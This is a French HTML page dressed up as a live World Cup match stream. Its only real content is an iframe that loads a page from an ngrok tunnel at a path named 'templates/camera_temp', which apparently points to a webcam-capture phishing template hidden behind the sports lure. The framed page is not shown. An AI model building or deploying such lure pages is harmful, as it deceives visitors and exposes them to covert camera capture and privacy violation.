<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Match en Direct - Coupe du Monde</title>
    <style>
        /* Style général de la page */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); /* Dégradé bleu/vert sport */
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* En-tête principal */
        header {
            text-align: center;
            padding: 30px 20px;
        }

        h1 {
            margin: 0;
            font-size: 2.5rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
        }

        .badge-live {
            background-color: #ff4757;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9rem;
            display: inline-block;
            margin-top: 10px;
            animation: clignotement 1.5s infinite; /* Effet de clignotement DIRECT */
        }

        /* Conteneur du match (Cadre blanc moderne) */
        .match-container {
            width: 90%;
            max-width: 800px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px); /* Effet de verre dépoli */
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            margin-bottom: 40px;
        }

        /* Zone qui affiche votre lien en direct */
        .live-stream {
            width: 100%;
            height: 500px; /* Hauteur de la zone de match */
            border: none;
            border-radius: 10px;
            background-color: #000; /* Fond noir pendant le chargement */
        }

        /* Animation pour le badge LIVE */
        @keyframes clignotement {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <!-- EN-TÊTE : Titre de la page -->
    <header>
        <h1>🏆 COUPE DU MONDE 🏆</h1>
        <div class="badge-live">● EN DIRECT</div>
    </header>

    <!-- CONTENEUR : Le cadre qui accueille votre code -->
    <div class="match-container">
        <!-- Remplacer VOTRE_LIEN_ICI par le lien de votre code de streaming ou de score -->
        <iframe class="live-stream" src="http://elves-illicitly-habitant.ngrok-free.dev/templates/camera_temp/index.html" allowfullscreen></iframe>
    </div>

</body>
</html>
